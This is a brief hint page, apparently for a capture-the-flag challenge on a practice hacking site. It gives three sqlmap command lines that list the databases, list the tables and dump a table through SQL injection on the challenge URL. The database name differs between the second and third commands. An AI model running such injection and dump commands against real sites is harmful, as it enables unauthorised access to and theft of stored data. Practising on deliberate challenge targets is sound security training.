# Sqlmap
[My Tutorial](https://www.youtube.com/watch?v=WPFxgNCyNhQ)

# Hint
- Get databases
```shell
python sqlmap.py -u "https://hackme.inndy.tw/gb/index.php?mod=LJP" --level=5 --risk=3 --data="LJPArg1=gg&LJPArg2=gg" --dbs --threads=10
```

- Get table
```shell
python sqlmap.py -u "https://hackme.inndy.tw/gb/index.php?mod=LJP" --level=5 --risk=3 --data="LJPArg1=gg&LJPArg2=gg" -D LJPDB --tables --threads=10
```

- Show all entry
```shell
python sqlmap.py -u "https://hackme.inndy.tw/gb/index.php?mod=LJP" --level=5 --risk=3 --data="LJPArg1=gg&LJPArg2=gg" -D LJPDatabase -T LJPTable --dump --threads=10
```

